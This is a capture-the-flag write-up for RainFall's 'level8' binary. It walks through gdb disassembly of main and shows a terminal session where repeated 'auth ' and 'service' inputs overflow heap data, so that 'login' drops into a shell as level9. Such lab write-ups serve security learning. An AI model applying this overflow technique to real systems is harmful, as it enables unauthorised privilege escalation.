```
gdb level8
b main
disass main
```

Instructions at +376, +406 tells us that the main is mainly (lol) a loop.

At +401 `system` can be called with "/bin/sh".

https://c9x.me/x86/html/file_module_x86_id_279.html

+107 : strings of fgets and `"auth "` are compared

+228 : strings of fgets and `"reset"` are compared

+282 : strings of fgets and `"service"` are compared

+343 : strings of fgets and `"login"` are compared

So first we can see that auth needs a space. There's 4 block in the loop that interest us.

By playing a bit with the binary, It's easy to understand that we are in a bit a role play. Using login directly on segfault. By using only "auth" printf still print `(nil), (nil)`, but using "auth " print `(0x804a008), (nil)`. "service" does something in the second address of printed. And "reset" will certainly reset your progression.


After some test I endup with this :
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
login
Password:
0x804a008, (nil)
reset
0x804a008, (nil) 
service
0x804a008, 0x804a008 
login
Password:
0x804a008, 0x804a008
service
0x804a008, 0x804a018 
login
Password:
0x804a008, 0x804a018
service
0x804a008, 0x804a028 
login
$ service
Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]
$ whoami
level9
$
```

End of the run ?

It's a bit weird because system can be called with only 2 "service", and sometimes it needs 3.

Thanks to hex-rays (decompiler), I rewrite the binary code. Basically it overflows the string into an int. The int do not have any assignment but the condition auth->a validates after overflow. The condition to overflow is to write more than 32 bit into the char[].